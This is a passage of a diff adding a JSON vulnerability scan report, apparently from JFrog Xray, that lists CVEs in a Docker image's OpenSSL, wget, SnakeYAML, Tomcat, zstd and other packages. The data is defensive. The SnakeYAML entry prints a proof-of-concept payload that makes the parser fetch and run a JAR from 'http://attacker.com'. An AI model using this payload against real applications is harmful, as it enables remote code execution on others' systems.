+        "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. One of those\nchecks confirms that the modulus ('p' parameter) is not too large. Trying to use\na very large modulus is slow and OpenSSL will not normally use a modulus which\nis over 10,000 bits in length.\n\nHowever the DH_check() function checks numerous aspects of the key or parameters\nthat have been supplied. Some of those checks use the supplied modulus value\neven if it has already been found to be too large.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulernable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the '-check' option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:libssl3:3.0.2-0ubuntu1.10": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libssl3:3.0.2-0ubuntu1.10",
+                  "full_path": "libssl3:3.0.2-0ubuntu1.10"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:openssl:3.0.2-0ubuntu1.10": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:openssl:3.0.2-0ubuntu1.10",
+                  "full_path": "openssl:3.0.2-0ubuntu1.10"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-526138",
+        "references": [
+          "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=9a0a4d3c1e7138915563c0df4fe6a3f9377b839c",
+          "https://security.netapp.com/advisory/ntap-20230803-0011/",
+          "http://www.openwall.com/lists/oss-security/2023/07/19/4",
+          "http://www.openwall.com/lists/oss-security/2023/07/31/1",
+          "http://www.openwall.com/lists/oss-security/2023/07/19/6",
+          "https://www.openssl.org/news/secadv/20230719.txt",
+          "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=1fa20cf2f506113c761777127a38bce5068740eb",
+          "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=8780a896543a654e757db1b9396383f9d8095528",
+          "https://lists.debian.org/debian-lts-announce/2023/08/msg00019.html",
+          "https://ubuntu.com/security/CVE-2023-3446",
+          "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=fc9867c1e03c22ebf56943be205202e576aabf23",
+          "http://www.openwall.com/lists/oss-security/2023/07/19/5"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2023-2975",
+            "cvss_v3_score": "5.3",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+          }
+        ],
+        "summary": "Issue summary: The AES-SIV cipher implementation contains a bug that causes\nit to ignore empty associated data entries which are unauthenticated as\na consequence.\n\nImpact summary: Applications that use the AES-SIV algorithm and want to\nauthenticate empty data entries as associated data can be mislead by removing\nadding or reordering such empty entries as these are ignored by the OpenSSL\nimplementation. We are currently unaware of any such applications.\n\nThe AES-SIV algorithm allows for authentication of multiple associated\ndata entries along with the encryption. To authenticate empty data the\napplication has to call EVP_EncryptUpdate() (or EVP_CipherUpdate()) with\nNULL pointer as the output buffer and 0 as the input buffer length.\nThe AES-SIV implementation in OpenSSL just returns success for such a call\ninstead of performing the associated data authentication operation.\nThe empty data thus will not be authenticated.\n\nAs this issue does not affect non-empty associated data authentication and\nwe expect it to be rare for an application to use empty associated data\nentries this is qualified as Low severity issue.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:libssl3:3.0.2-0ubuntu1.10": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libssl3:3.0.2-0ubuntu1.10",
+                  "full_path": "libssl3:3.0.2-0ubuntu1.10"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:openssl:3.0.2-0ubuntu1.10": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:openssl:3.0.2-0ubuntu1.10",
+                  "full_path": "openssl:3.0.2-0ubuntu1.10"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-523315",
+        "references": [
+          "https://ubuntu.com/security/CVE-2023-2975",
+          "https://security.netapp.com/advisory/ntap-20230725-0004/",
+          "http://www.openwall.com/lists/oss-security/2023/07/19/5",
+          "https://www.openssl.org/news/secadv/20230714.txt",
+          "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=6a83f0c958811f07e0d11dfc6b5a6a98edfd5bdc",
+          "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=00e2f5eea29994d19293ec4e8c8775ba73678598",
+          "http://www.openwall.com/lists/oss-security/2023/07/15/1"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2023-3817",
+            "cvss_v3_score": "5.3",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+          }
+        ],
+        "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. After fixing\nCVE-2023-3446 it was discovered that a large q parameter value can also trigger\nan overly long computation during some of these checks. A correct q value,\nif present, cannot be larger than the modulus p parameter, thus it is\nunnecessary to perform these checks if q is larger than p.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulnerable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the \"-check\" option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:libssl3:3.0.2-0ubuntu1.10": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libssl3:3.0.2-0ubuntu1.10",
+                  "full_path": "libssl3:3.0.2-0ubuntu1.10"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:openssl:3.0.2-0ubuntu1.10": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:openssl:3.0.2-0ubuntu1.10",
+                  "full_path": "openssl:3.0.2-0ubuntu1.10"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-526926",
+        "references": [
+          "https://ubuntu.com/security/CVE-2023-3817",
+          "http://www.openwall.com/lists/oss-security/2023/09/22/9",
+          "http://www.openwall.com/lists/oss-security/2023/09/22/11",
+          "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=9002fd07327a91f35ba6c1307e71fa6fd4409b7f",
+          "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=91ddeba0f2269b017dc06c46c993a788974b1aa5",
+          "https://lists.debian.org/debian-lts-announce/2023/08/msg00019.html",
+          "http://seclists.org/fulldisclosure/2023/Jul/43",
+          "http://www.openwall.com/lists/oss-security/2023/07/31/1",
+          "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=6a1eb62c29db6cb5eec707f9338aee00f44e26f5",
+          "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=869ad69aadd985c7b8ca6f4e5dd0eb274c9f3644",
+          "https://security.netapp.com/advisory/ntap-20230818-0014/",
+          "https://www.openssl.org/news/secadv/20230731.txt"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2021-31879",
+            "cvss_v2_score": "5.8",
+            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:N",
+            "cvss_v3_score": "6.1",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+          }
+        ],
+        "summary": "GNU Wget through 1.21.1 does not omit the Authorization header upon a redirect to a different origin, a related issue to CVE-2018-1000007.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:wget:1.21.2-2ubuntu1": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:wget:1.21.2-2ubuntu1",
+                  "full_path": "wget:1.21.2-2ubuntu1"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-181368",
+        "references": [
+          "https://mail.gnu.org/archive/html/bug-wget/2021-02/msg00002.html",
+          "https://ubuntu.com/security/CVE-2021-31879",
+          "https://security.netapp.com/advisory/ntap-20210618-0002/"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-1471",
+            "cvss_v3_score": "9.8",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+          }
+        ],
+        "summary": "SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.",
+        "severity": "Critical",
+        "components": {
+          "gav://org.yaml:snakeyaml:1.33": {
+            "fixed_versions": [
+              "[2.0]"
+            ],
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6/sha256__0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6.tar",
+                  "full_path": "sha256__0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6.tar"
+                },
+                {
+                  "component_id": "gav://org.springframework.samples:spring-petclinic:3.1.0-SNAPSHOT",
+                  "full_path": "spring-petclinic.jar"
+                },
+                {
+                  "component_id": "gav://org.yaml:snakeyaml:1.33",
+                  "full_path": "BOOT-INF/lib/snakeyaml-1.33.jar"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-262821",
+        "references": [
+          "https://github.com/mbechler/marshalsec",
+          "https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64581479",
+          "https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2",
+          "https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true"
+        ],
+        "extended_information": {
+          "short_description": "A design problem in SnakeYAML leads to remote code execution when deserializing untrusted YAML data.",
+          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a Java `Constructor` can lead to remote code execution due to deserialization.\n\nSnakeYaml's Constructor class, which inherits from SafeConstructor, allows any class type to be deserialized. A ConstructorException is thrown, but only after the malicious\npayload is deserialized.\n\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. \nThe attacker must deserialize a [Java \"gadget\" class](http://frohoff.github.io/owaspsd-deserialize-my-shorts/) that's available in the application's classpath in order to achieve code execution via the deserialization. However - there are gadget classes that are available by default such as the built-in `javax.script.ScriptEngineManager`.\n\nA remote code execution PoC example, using the Java built-in class `javax.script.ScriptEngineManager`:\n```\nString strYaml = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n                + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";;\nYaml yaml = new Yaml(new Constructor(Foo.class));\nyaml.load(strYaml);\n```\nThe PoC will run an arbitrary JAR file supplied from `http://attacker.com`. Note that even though `Constructor` receives a specific class type (`Foo.class`), any gadget class can be deserialized.\n\nNote that the vulnerability will not apply to applications that use the (non-default) `SafeConstructor`",
+          "jfrog_research_severity": "Critical",
+          "jfrog_research_severity_reasons": [
+            {
+              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
+              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. The `Yaml` class must be initialized either with no arguments (default initialization) or with a `Constructor` instance. The vulnerability can still be exploited even if the `Constructor` instance is initialized with a specific class type.",
+              "is_positive": true
+            },
+            {
+              "name": "The issue results in a severe impact (such as remote code execution)",
+              "description": "Remote code execution."
+            },
+            {
+              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
+              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data. In addition, the vulnerability is exploitable when the `Yaml` class is initialized with default arguments."
+            },
+            {
+              "name": "The issue has an exploit published",
+              "description": "PoC demonstrates remote code execution."
+            }
+          ],
+          "remediation": "##### Development mitigations\n\nUse the (non-default) `SafeConstructor` class to initialize the `Yaml` class -\n```\nLoaderOptions options = new LoaderOptions();\nYaml yaml = new Yaml(new SafeConstructor(options));\nString strYaml = Files.readString(Path.of(\"input_file\")); \nString parsed = yaml.load(strYaml);\n```\n\nNote that this class will only allow deserialization of [basic types](https://github.com/Thinkofname/snakeyaml/blob/master/src/main/java/org/yaml/snakeyaml/constructor/SafeConstructor.java#L52) such as Integers, Strings, Maps etc."
+        }
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-3219",
+            "cvss_v3_score": "3.3",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"
+          }
+        ],
+        "summary": "GnuPG can be made to spin on a relatively small input by (for example) crafting a public key with thousands of signatures attached, compressed down to just a few KB.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:gpgv:2.2.27-3ubuntu2.1": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:gpgv:2.2.27-3ubuntu2.1",
+                  "full_path": "gpgv:2.2.27-3ubuntu2.1"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-256472",
+        "references": [
+          "https://bugzilla.redhat.com/show_bug.cgi?id=2127010",
+          "https://dev.gnupg.org/T5993",
+          "https://ubuntu.com/security/CVE-2022-3219",
+          "https://marc.info/?l=oss-security\u0026m=165696590211434\u0026w=4",
+          "https://access.redhat.com/security/cve/CVE-2022-3219",
+          "https://security.netapp.com/advisory/ntap-20230324-0001/",
+          "https://dev.gnupg.org/D556"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2023-41080",
+            "cvss_v3_score": "6.1",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+          }
+        ],
+        "summary": "URL Redirection to Untrusted Site ('Open Redirect') vulnerability in FORM authentication feature Apache Tomcat.This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M10, from 10.1.0-M1 through 10.0.12, from 9.0.0-M1 through 9.0.79 and from 8.5.0 through 8.5.92.\n\nThe vulnerability is limited to the ROOT (default) web application.",
+        "severity": "Medium",
+        "components": {
+          "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.12": {
+            "fixed_versions": [
+              "[10.1.13]",
+              "[11.0.0-M11]",
+              "[8.5.93]",
+              "[9.0.80]"
+            ],
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6/sha256__0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6.tar",
+                  "full_path": "sha256__0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6.tar"
+                },
+                {
+                  "component_id": "gav://org.springframework.samples:spring-petclinic:3.1.0-SNAPSHOT",
+                  "full_path": "spring-petclinic.jar"
+                },
+                {
+                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.12",
+                  "full_path": "BOOT-INF/lib/tomcat-embed-core-10.1.12.jar"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-529034",
+        "references": [
+          "https://lists.apache.org/thread/71wvwprtx2j2m54fovq9zr7gbm2wow2f"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-3857",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "A flaw was found in libpng 1.6.38. A crafted PNG image can lead to a segmentation fault and denial of service in png_setup_paeth_row() function.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:libpng16-16:1.6.37-3build5": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libpng16-16:1.6.37-3build5",
+                  "full_path": "libpng16-16:1.6.37-3build5"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-261565",
+        "references": [
+          "https://ubuntu.com/security/CVE-2022-3857",
+          "https://security.netapp.com/advisory/ntap-20230406-0004/",
+          "https://sourceforge.net/p/libpng/bugs/300/"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-4899",
+            "cvss_v3_score": "7.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "A vulnerability was found in zstd v1.4.10, where an attacker can supply empty string as an argument to the command line tool to cause buffer overrun.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:libzstd1:1.4.8+dfsg-3build1": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libzstd1:1.4.8+dfsg-3build1",
+                  "full_path": "libzstd1:1.4.8+dfsg-3build1"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-513908",
+        "references": [
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QYLDK6ODVC4LJSDULLX6Q2YHTFOWABCN/",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JEHRBBYYTPA4DETOM5XAKGCP37NUTLOA/",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/C63HAGVLQA6FJNDCHR7CNZZL6VSLILB2/",
+          "https://github.com/facebook/zstd/issues/3200",
+          "https://ubuntu.com/security/CVE-2022-4899",
+          "https://security.netapp.com/advisory/ntap-20230725-0005/"
+        ],
+        "extended_information": {
+          "short_description": "Out-of-bounds read in zstd may lead denial of service when using crafted command-line arguments.",
+          "full_description": "[Zstandard](https://facebook.github.io/zstd/) is a fast lossless compression algorithm, providing high compression ratios and targeting real-time compression scenarios at zlib-level.\n`zstd` is the reference implementation in C that offers a very wide range of speed / compression trade-off, and is backed by an extremely fast decoder.\nIt was discovered that running the `zstd` tool with arbitrary arguments can lead to an OOB read due to a design flaw, which may lead to a crash of `zstd`. Since `zstd` is a standalone (forked) tool - the crash has a minimal security impact.\n\nSpecifically, passing the `--output-dir-flat` or `--output-dir-mirror` arguments with an empty string, leads to an OOB read.\n\nIt should be noted that the OOB read is of 1 byte only, which on modern systems does not even lead to a crash (in most cases of production-built software)",
+          "jfrog_research_severity": "Low",
+          "jfrog_research_severity_reasons": [
+            {
+              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
+              "description": "Passing an empty string to the flags \"--output-dir-flat\" or \"--output-dir-mirror\" will trigger the 1-byte OOB read"
+            },
+            {
+              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
+              "description": "The CVSS does not take into account the high attack complexity and low real-world severity of this issue",
+              "is_positive": true
+            },
+            {
+              "name": "The issue cannot result in a severe impact (such as remote code execution)",
+              "description": "Crashing a forked process has minimal to no security impact. Furthermore, a 1-byte OOB read will not lead to a crash in almost all cases.",
+              "is_positive": true
+            },
+            {
+              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
+              "description": "The attacker must be able to supply command line arguments to an invocation of the `zstd` CLI tool.",
+              "is_positive": true
+            }
+          ]
+        }
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2023-4016",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "Under some circumstances, this weakness allows a user who has access to run the “ps” utility on a machine, the ability to write almost unlimited amounts of unfiltered data into the process heap.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:libprocps8:2:3.3.17-6ubuntu2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libprocps8:2:3.3.17-6ubuntu2",
+                  "full_path": "libprocps8:2:3.3.17-6ubuntu2"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:procps:2:3.3.17-6ubuntu2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:procps:2:3.3.17-6ubuntu2",
+                  "full_path": "procps:2:3.3.17-6ubuntu2"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-527294",
+        "references": [
+          "https://ubuntu.com/security/CVE-2023-4016",
+          "https://gitlab.com/procps-ng/procps",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SUETRRT24OFGPYK6ACPM5VUGHNKH5CQ5/"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2023-2953",
+            "cvss_v3_score": "7.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "A vulnerability was found in openldap. This security flaw causes a null pointer dereference in ber_memalloc_x() function.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:libldap-2.5-0:2.5.16+dfsg-0ubuntu0.22.04.1": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libldap-2.5-0:2.5.16+dfsg-0ubuntu0.22.04.1",
+                  "full_path": "libldap-2.5-0:2.5.16+dfsg-0ubuntu0.22.04.1"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-520964",
+        "references": [
+          "https://support.apple.com/kb/HT213844",
+          "https://ubuntu.com/security/CVE-2023-2953",
+          "http://seclists.org/fulldisclosure/2023/Jul/52",
+          "https://support.apple.com/kb/HT213843",
+          "http://seclists.org/fulldisclosure/2023/Jul/48",
+          "https://security.netapp.com/advisory/ntap-20230703-0005/",
+          "https://support.apple.com/kb/HT213845",
+          "http://seclists.org/fulldisclosure/2023/Jul/47",
+          "https://access.redhat.com/security/cve/CVE-2023-2953",
+          "https://bugs.openldap.org/show_bug.cgi?id=9904"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-3715",
+            "cvss_v3_score": "7.8",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+          }
+        ],
+        "summary": "A flaw was found in the bash package, where a heap-buffer overflow can occur in valid parameter_transform. This issue may lead to memory problems.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:bash:5.1-6ubuntu1": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
